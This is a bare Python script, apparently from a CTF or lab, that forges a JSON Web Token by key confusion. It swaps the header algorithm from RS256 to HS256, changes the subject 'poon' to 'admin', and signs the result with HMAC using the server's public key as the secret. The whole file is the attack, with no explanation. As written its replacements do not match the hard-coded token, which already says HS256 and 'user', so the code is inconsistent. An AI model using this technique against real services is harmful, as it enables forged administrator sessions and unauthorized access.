import hmac
import hashlib
import base64
import binascii

public_key = open('public.pem')

key = public_key.read()

orig_jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiaWF0IjoxNjcwMzE5MjUxLCJleHAiOjE2NzA0MDU2NTF9.xwDAH7TXh2gFHXNO10XpHesNB7RC3e_3vRG554w-4BI"

particles = orig_jwt.split(".")

def padding(part):
    if len(part) % 4 != 0:
        padding = 4- (len(part) % 4)
        return part + ("="*padding)
    return part

def sign(part, key):
    return base64.urlsafe_b64encode(hmac.new(key.encode(), part.encode(), hashlib.sha256).digest()).decode("utf-8").rstrip("=")

header = base64.b64decode(padding(particles[0])).decode("utf-8")
body = base64.b64decode(padding(particles[1])).decode("utf-8")

header = header.replace("RS256","HS256")
body = body.replace("poon","admin")

print(header)
print(body)

header = base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=")
body = base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=")

payload = header + "." + body
print(payload)

signature = sign(payload, key)
print(payload + "." + signature)